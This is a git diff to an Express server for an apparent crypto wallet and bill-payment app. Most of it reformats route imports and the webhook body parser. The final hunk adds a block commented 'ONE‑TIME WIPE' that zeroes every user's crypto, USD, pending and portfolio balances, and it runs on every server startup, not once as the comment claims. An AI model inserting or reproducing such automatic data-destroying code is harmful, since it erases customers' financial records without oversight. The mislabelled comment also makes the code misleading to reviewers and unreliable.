@@ -8,6 +8,7 @@ const morgan = require("morgan");
 const jwt = require("jsonwebtoken");
 const cors = require("cors");
 
+const User = require("./models/user");            // ← Import User model for wipe
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -28,10 +29,14 @@ app.use(morgan("combined"));
 app.use(helmet());
 
 // Raw Body Parser for Webhook Routes
-app.use('/webhook', express.raw({ type: 'application/json' }), (req, res, next) => {
-  req.rawBody = req.body.toString('utf8');
-  next();
-});
+app.use(
+  '/webhook',
+  express.raw({ type: "application/json" }),
+  (req, res, next) => {
+    req.rawBody = req.body.toString("utf8");
+    next();
+  }
+);
 
 // JSON Body Parser for Other Routes
 app.use(express.json());
@@ -66,52 +71,51 @@ const authenticateToken = (req, res, next) => {
 
   jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
     if (err) return res.status(403).json({ success: false, error: "Forbidden: Invalid token." });
-
     req.user = user;
     next();
   });
 };
 
 // Route Imports
-const logoutRoutes = require("./routes/logout");
-const refreshtokenRoutes = require("./routes/refreshtoken");
-const passwordpinRoutes = require("./routes/passwordpin");
-const signinRoutes = require("./routes/signin");
-const signupRoutes = require("./routes/signup");
-const usernameRoutes = require("./routes/username");
-const balanceRoutes = require("./routes/balance");
-const webhookRoutes = require("./routes/obiexwebhooktrx");
-const depositRoutes = require("./routes/deposit");
-const deleteuserRoutes = require("./adminRoutes/deleteuser");
-const SetfeeRoutes = require("./adminRoutes/cryptofee");
-const verifyotpRoutes = require("./routes/verifyotp");
-const usernamecheckRoutes = require("./routes/usernamecheck");
-const withdrawRoutes = require("./routes/withdraw");
-const validatewithdrawRoutes = require("./routes/validate-balance");
+const logoutRoutes            = require("./routes/logout");
+const refreshtokenRoutes      = require("./routes/refreshtoken");
+const passwordpinRoutes       = require("./routes/passwordpin");
+const signinRoutes            = require("./routes/signin");
+const signupRoutes            = require("./routes/signup");
+const usernameRoutes          = require("./routes/username");
+const balanceRoutes           = require("./routes/balance");
+const webhookRoutes           = require("./routes/obiexwebhooktrx");
+const depositRoutes           = require("./routes/deposit");
+const deleteuserRoutes        = require("./adminRoutes/deleteuser");
+const SetfeeRoutes            = require("./adminRoutes/cryptofee");
+const verifyotpRoutes         = require("./routes/verifyotp");
+const usernamecheckRoutes     = require("./routes/usernamecheck");
+const withdrawRoutes          = require("./routes/withdraw");
+const validatewithdrawRoutes  = require("./routes/validate-balance");
 const updateuseraddressRoutes = require("./adminRoutes/updatewalletaddress");
-const fetchrefreshtoken = require("./adminRoutes/refresh-token");
-const FunduserRoutes = require("./adminRoutes/funduser");
-const clearpendingRoutes = require("./adminRoutes/pendingbalance");
-const fetchwalletRoutes = require("./adminRoutes/fetchwallet");
-const fetchtransactionRoutes = require("./adminRoutes/fetchtransactions");
-const deletepinRoutes = require("./adminRoutes/deletepin");
-const nairaPriceRouter = require('./routes/nairaprice');
-const onrampRoutes = require('./adminRoutes/onramp');
-const offrampRoutes = require('./adminRoutes/offramp');
-const walletRoutes = require('./routes/wallet');
-const TwoFARoutes = require('./auth/setup-2fa');
-const AirtimeRoutes = require('./routes/airtime');
-const DataRoutes = require('./routes/data');
-const VerifybillRoutes = require('./routes/verifybill');
-const ElectricityRoutes = require('./routes/electricity');
-const BettingRoutes = require('./routes/betting');
-const CableTVRoutes = require('./routes/cabletv');
-const fetchdataplans = require('./routes/dataplans');
-const billwebhookRoutes = require('./routes/billwebhook');
-const dashboardRoutes = require('./routes/dashboard');
-const pricemarkdownRoutes = require('./adminRoutes/pricemarkdown');
-const swapRoutes = require('./routes/swap');
-const ngnzSwapRoutes = require('./routes/NGNZSwaps');
+const fetchrefreshtoken       = require("./adminRoutes/refresh-token");
+const FunduserRoutes          = require("./adminRoutes/funduser");
+const clearpendingRoutes      = require("./adminRoutes/pendingbalance");
+const fetchwalletRoutes       = require("./adminRoutes/fetchwallet");
+const fetchtransactionRoutes  = require("./adminRoutes/fetchtransactions");
+const deletepinRoutes         = require("./adminRoutes/deletepin");
+const nairaPriceRouter        = require("./routes/nairaprice");
+const onrampRoutes            = require("./adminRoutes/onramp");
+const offrampRoutes           = require("./adminRoutes/offramp");
+const walletRoutes            = require("./routes/wallet");
+const TwoFARoutes             = require("./auth/setup-2fa");
+const AirtimeRoutes           = require("./routes/airtime");
+const DataRoutes              = require("./routes/data");
+const VerifybillRoutes        = require("./routes/verifybill");
+const ElectricityRoutes       = require("./routes/electricity");
+const BettingRoutes           = require("./routes/betting");
+const CableTVRoutes           = require("./routes/cabletv");
+const fetchdataplans          = require("./routes/dataplans");
+const billwebhookRoutes       = require("./routes/billwebhook");
+const dashboardRoutes         = require("./routes/dashboard");
+const pricemarkdownRoutes     = require("./adminRoutes/pricemarkdown");
+const swapRoutes              = require("./routes/swap");
+const ngnzSwapRoutes          = require("./routes/NGNZSwaps");
 
 // Public Routes
 app.use("/signin", signinRoutes);
@@ -178,7 +182,53 @@ const startServer = async () => {
   try {
     await mongoose.connect(process.env.MONGODB_URI, {});
     console.log("✅ MongoDB Connected");
-    
+
+    // ─── ONE‑TIME WIPE ──────────────────────────────────────
+    await User.updateMany(
+      {},
+      {
+        $set: {
+          solBalance: 0,
+          btcBalance: 0,
+          usdtBalance: 0,
+          usdcBalance: 0,
+          ethBalance: 0,
+          bnbBalance: 0,
+          dogeBalance: 0,
+          maticBalance: 0,
+          avaxBalance: 0,
+          ngnzBalance: 0,
+
+          solBalanceUSD: 0,
+          btcBalanceUSD: 0,
+          usdtBalanceUSD: 0,
+          usdcBalanceUSD: 0,
+          ethBalanceUSD: 0,
+          bnbBalanceUSD: 0,
+          dogeBalanceUSD: 0,
+          maticBalanceUSD: 0,
+          avaxBalanceUSD: 0,
+          ngnzBalanceUSD: 0,
+
+          solPendingBalance: 0,
+          btcPendingBalance: 0,
+          usdtPendingBalance: 0,
+          usdcPendingBalance: 0,
+          ethPendingBalance: 0,
+          bnbPendingBalance: 0,
+          dogePendingBalance: 0,
+          maticPendingBalance: 0,
+          avaxPendingBalance: 0,
+          ngnzPendingBalance: 0,
+
+          totalPortfolioBalance: 0,
+          portfolioLastUpdated: new Date()
+        }
+      }
+    );
+    console.log("⚠️  Auto‑wiping all user balances to zero…");
+    // ────────────────────────────────────────────────────────
+
     app.listen(PORT, "0.0.0.0", () => {
       console.log(`🔥 Server running on port ${PORT}`);
     });
